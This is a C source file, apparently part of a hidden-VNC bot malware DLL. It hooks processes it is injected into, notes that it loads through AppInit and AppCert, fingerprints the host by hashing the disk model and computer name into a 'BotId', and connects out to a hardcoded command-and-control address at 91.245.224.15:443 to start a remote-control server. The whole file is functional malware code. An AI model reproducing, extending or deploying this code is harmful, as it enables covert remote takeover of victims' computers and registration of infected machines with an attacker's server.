#include "vncmain.h"
#include "vncwnd.h"
#include "wndhook.h"
#include "activdll.h"

#define		szUnknown		"UNKNOWN"

HANDLE						g_AppHeap = 0;				// current DLL heap
static LONG volatile		g_AttachCount = 0;			// number of process attaches
static BOOL					g_DllInitStatus = FALSE;	
BOOL						g_bServerDll = FALSE;
PVOID						g_hServer = NULL;

// from vnchook.c
extern WINERROR VncHookActivate(void);

// from vncsrv.c
extern WINERROR VncServerInit(HMODULE hModule);
extern VOID VncServerCleanup(VOID);
extern WINERROR __stdcall StartServer(PVOID * pServerHandle, SOCKADDR_IN * pServerAddress, LPSTR pClientId);
extern void __stdcall StopServer(PVOID ServerHandle);

PVOID __stdcall	AppAlloc(ULONG Size)
{
	return hAlloc(Size);
}

void __stdcall AppFree(PVOID pMem)
{
	hFree(pMem);
}

PVOID __stdcall	AppRealloc(PVOID pMem, ULONG Size)
{
	return hRealloc(pMem, Size);
}

// ----- DLL startup and cleanup routines -------------------------------------------------------------------------------

//
//	Client DLL initialization routine.
//
static WINERROR ClientStartup(HMODULE hModule, PVOID pContext)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;

	do	// not a loop
	{
		// create heap for allocations
		if ((g_AppHeap = HeapCreate(0, 2048000, 0)) == NULL)
			break;

		// init global variables
		if ((Status = InitGlobals(hModule, G_SYSTEM_VERSION | G_CURRENT_PROCESS_ID | G_APP_SHUTDOWN_EVENT | G_CURRENT_PROCESS_PATH)) != NO_ERROR)
			break;

		// Initializing hoking engine
		if ((Status = InitHooks()) != NO_ERROR)
			break;

		// Initializing default security attributes
		if (LOBYTE(LOWORD(g_SystemVersion)) > 5)
			LsaSupInitializeLowSecurityAttributes(&g_DefaultSA);
		else
			LsaSupInitializeDefaultSecurityAttributes(&g_DefaultSA);

		// Initializing VNC-specific callbacks
		g_pChangeDesktopNameA = &VncChangeDesktopNameA;
		g_pChangeDesktopNameW = &VncChangeDesktopNameW;
		g_pOnCreateProcessA = &VncOnCreateProcessA;
		g_pOnCreateProcessW = &VncOnCreateProcessW;

		// Init vnc app staff
		if ((Status = VncServerInit(hModule)) != NO_ERROR)
		{
			if (Status == ERROR_FILE_NOT_FOUND)
			{
				// VNC shared section was not initialized. This means we are not within VNC session process.
				AcStartup(pContext, FALSE);
			}
			break;
		}

		// Initializing active DLL engine
		if (((Status = AcStartup(pContext, TRUE)) != NO_ERROR) && (Status != ERROR_FILE_NOT_FOUND))
			break;

		// set user hooks: u32, gdi, etc
		Status = VncHookActivate();
		WndHookStartup();

	} while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return (Status);
}

//
//	Client DLL cleanup routine. It can be called only if previouse ClientStartup() finished successfully.
//
static WINERROR ClientCleanup(void)
{
	WINERROR Status = NO_ERROR;

	if (g_AppShutdownEvent)
	{
		SetEvent(g_AppShutdownEvent);

		CleanupHooks();

		// --------------------------------------------------------------------------------------------------------------
		// Place your DLL-cleanup code here
		// --------------------------------------------------------------------------------------------------------------
		VncServerCleanup();

		// Releasing default security attributes
		LsaSupFreeSecurityAttributes(&g_DefaultSA);

		ReleaseGlobals();
		if (g_AppHeap)
			HeapDestroy(g_AppHeap);
	}	// if (g_AppShutdownEvent)
	
	return Status;
}

// DEMO id implementation
// -- cut

// perform rol operation on 32-bit argument
DWORD rol(DWORD dwArg, BYTE bPlaces)
{
	return ((dwArg << bPlaces) | (dwArg >> (32 - bPlaces)));
}

// make dword hash from string
DWORD _myHashStringW(LPWSTR wszString)
{
	DWORD dwResult = 0;	// output result, temp hash value
	BYTE b_cr = 0;	// cr shift value
	ULONG i = 0;	// counter
	WORD *pwChar = (WORD *)wszString;

	// loop passed string
	while (*pwChar) 
	{

		// make step's shift value, normalized to 4-byte shift (31 max)
		b_cr = (b_cr ^ (BYTE)(*pwChar)) & 0x1F;

		// xor hash with current char and rol hash, cr
		dwResult = rol(dwResult ^ (BYTE)(*pwChar), b_cr);

		pwChar++;

	}	// while !null char

	// output result
	return dwResult;
}

//
// Calculates hash for name of first physical disk
// HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Disk\Enum, value name "0"
//
DWORD GetFirstVolumeModelHash()
{
	DWORD dwRes = 0;
	HKEY hKey = NULL;
	DWORD dwDataLen = 0;
	WCHAR wszBuff[0x1000];

	LPCWSTR wszSubkey = L"SYSTEM\\CurrentControlSet\\services\\Disk\\Enum";
	LPCWSTR wszParamName = L"0";

	do 
	{
		if (ERROR_SUCCESS != RegOpenKeyExW(HKEY_LOCAL_MACHINE, wszSubkey, 0, KEY_READ, &hKey))
			break;

		dwDataLen = sizeof(wszBuff);

		if (ERROR_SUCCESS != RegQueryValueExW(hKey, wszParamName, NULL, NULL, (LPBYTE)wszBuff, &dwDataLen))
			break;

		dwRes = _myHashStringW(wszBuff);
	} while (FALSE);

	RegCloseKey(hKey);
	return dwRes;
}

DWORD GetComputerNameHash()
{
	DWORD dwCompNameLen = MAX_COMPUTERNAME_LENGTH + 1;
	WCHAR wszCompName[MAX_COMPUTERNAME_LENGTH + 1];

	GetComputerNameW(wszCompName, &dwCompNameLen);
	return _myHashStringW(wszCompName);
}

// -- cut

//
//	Our DLL entry point.	
//
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID	lpReserved)
{
	WINERROR Status = NO_ERROR;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// The DLL can be attached to a process multiple times (as AppInit and as AppCert, for example)
		// Perform an initialization only once, other times just return g_DllInitStatus
		if (_InterlockedIncrement(&g_AttachCount) == 1)
		{
			PCHAR ProcessPath = NULL, ProcessName = szUnknown;
			g_CurrentModule = hModule;
#if	_DBG
			// Getting current process name.
			if (ProcessPath = Alloc(MAX_PATH))
			{
				GetModuleFileName(GetModuleHandle(NULL), ProcessPath, MAX_PATH);
				ProcessName = strrchr(ProcessPath, '\\') + 1;
			}
#endif
#ifdef _WIN64
			DbgPrint("Attached to 64-bit process \"%s\" at 0x%x.\n", ProcessName, (ULONG_PTR)hModule);
#else
			DbgPrint("Attached to 32-bit process \"%s\" at 0x%x.\n", ProcessName, (ULONG_PTR)hModule);
#endif

			Status = ClientStartup(hModule, lpReserved);
			if (Status == NO_ERROR)
			{
				g_DllInitStatus = TRUE;
				WndHookOnThreadAttach(GetCurrentThreadId());
			}
			else if (Status == ERROR_FILE_NOT_FOUND)
			{
				WSADATA Init;
				WSAStartup(MAKEWORD(2, 2), &Init);

				SOCKADDR_IN ServerAddr;
				ServerAddr.sin_family = AF_INET;
				int AddrLen = sizeof(ServerAddr);
				WSAStringToAddressW(L"91.245.224.15:443", AF_INET, NULL, (LPSOCKADDR)&ServerAddr, &AddrLen);

				CHAR BotId[MAX_PATH];
				wsprintfA(BotId, "%08X%08X", GetFirstVolumeModelHash(), GetComputerNameHash());
				StartServer(&g_hServer, &ServerAddr, BotId);
				g_DllInitStatus = TRUE;
				g_bServerDll = TRUE;

				WSACleanup();
			}
			else
				g_DllInitStatus = FALSE;
		}
		break;

	case DLL_THREAD_ATTACH:
		ASSERT(g_DllInitStatus);
		if (!g_bServerDll)
			WndHookOnThreadAttach(GetCurrentThreadId());
		break;

	case DLL_THREAD_DETACH:
		ASSERT(g_DllInitStatus);
		if (!g_bServerDll)
			WndHookOnThreadDetach(GetCurrentThreadId());
		break;

	case DLL_PROCESS_DETACH:
		if (_InterlockedDecrement(&g_AttachCount) == 0)
		{
			if (g_bServerDll && g_hServer)
				StopServer(g_hServer);

			if (g_DllInitStatus)
				ClientCleanup();
#ifdef _WIN64
			DbgPrint("Detached from the 64-bit process.\n");
#else
			DbgPrint("Detached from the 32-bit process.\n");
#endif
		}
		break;
	default:
		ASSERT(FALSE);
	}

	return (g_DllInitStatus);
}

LONG _cdecl main(VOID)
{
}

// Required to link with ntdll.lib
ULONG  __security_cookie;
